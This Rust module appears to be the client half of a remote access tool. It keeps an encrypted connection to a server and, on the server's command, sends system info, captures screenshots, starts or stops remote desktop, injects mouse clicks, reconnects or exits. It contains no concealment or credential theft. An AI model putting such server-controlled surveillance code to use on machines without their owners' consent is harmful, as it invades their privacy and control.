use crate::features::other::{take_screenshot, client_info};
use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click};
use common::async_impl::packets::*;
use rand_chacha::ChaCha20Rng;
use tokio::sync::oneshot;
use tokio::sync::mpsc;
use std::sync::Mutex;
use once_cell::sync::Lazy;

use common::async_impl::connection::{ConnectionReader, ConnectionWriter};

static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
    Mutex::new(None)
});

pub async fn reading_loop(
    mut reader: ConnectionReader<ClientboundPacket>,
    close_sender: oneshot::Sender<()>,
    secret: Option<Vec<u8>>,
    mut nonce_generator: Option<ChaCha20Rng>,
) {
    'l: loop {
        match reader.read_packet(&secret, nonce_generator.as_mut()).await {
            Ok(Some(ClientboundPacket::InitClient)) => {
                let client_info = client_info();
                match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                    Ok(_) => println!("Sent client info to server"),
                    Err(e) => {
                        println!("Error sending client info: {}", e);
                        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
                        match send_packet(ServerboundPacket::ClientInfo(client_info)).await {
                            Ok(_) => println!("Sent client info to server on retry"),
                            Err(e) => println!("Failed to send client info on retry: {}", e),
                        }
                    }
                }
            }

            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => {
                match display.parse::<i32>() {
                    Ok(display_id) => {
                        let screenshot_data = take_screenshot(display_id);
                        match send_packet(ServerboundPacket::ScreenshotResult(screenshot_data)).await {
                            Ok(_) => println!("Sent screenshot to server"),
                            Err(e) => println!("Error sending screenshot: {}", e),
                        }
                    },
                    Err(e) => println!("Invalid display ID: {}", e),
                }
            }

            Ok(Some(ClientboundPacket::Disconnect)) => {
                println!("Server requested disconnection. Exiting program.");
                std::process::exit(0);
            }

            Ok(Some(ClientboundPacket::Reconnect)) => {
                println!("Server requested reconnection. Reconnecting...");
                close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                break 'l;
            }

            Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => {
                start_remote_desktop(config);
            }

            Ok(Some(ClientboundPacket::StopRemoteDesktop)) => {
                stop_remote_desktop();
            }

            Ok(Some(ClientboundPacket::MouseClick(click_data))) => {
                mouse_click(click_data);
            }

            Ok(Some(p)) => {
                println!("!!Unhandled packet: {:?}", p);
            }
            
            Err(e) => {
                println!("Connection error: {}", e);
                close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                break 'l;
            }
            
            _ => {
                println!("Connection closed");
                close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                break 'l;
            }
        }
    }
    
    clear_packet_sender();
}

pub async fn writing_loop(
    mut writer: ConnectionWriter<ServerboundPacket>,
    mut rx: oneshot::Receiver<()>,
    secret: Option<Vec<u8>>,
    mut nonce_generator: Option<ChaCha20Rng>,
) {
    let (packet_tx, mut packet_rx) = mpsc::channel::<ServerboundPacket>(32);
    
    {
        let mut sender = PACKET_SENDER.lock().unwrap();
        *sender = None;
        *sender = Some(packet_tx);
    }
    
    loop {
        tokio::select! {
            _ = &mut rx => {
                println!("Closing writing loop");
                break;
            },
            Some(packet) = packet_rx.recv() => {
                if let Err(e) = writer.write_packet(
                    packet,
                    &secret,
                    nonce_generator.as_mut()
                ).await {
                    println!("Error sending packet: {}", e);
                    break;
                }
            }
        }
    }
}

// Helper function to clear the packet sender
fn clear_packet_sender() {
    let mut sender = PACKET_SENDER.lock().unwrap();
    *sender = None;
}

pub async fn send_packet(packet: ServerboundPacket) -> Result<(), String> {
    for _ in 0..5 {
        // Try to get the packet sender
        let sender_opt = {
            let sender_guard = PACKET_SENDER.lock().unwrap();
            sender_guard.clone()
        };
        
        if let Some(sender) = sender_opt {
            return sender.send(packet).await.map_err(|e| e.to_string());
        }
        
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }    
    Err("Packet sender not initialized after multiple attempts".to_string())
}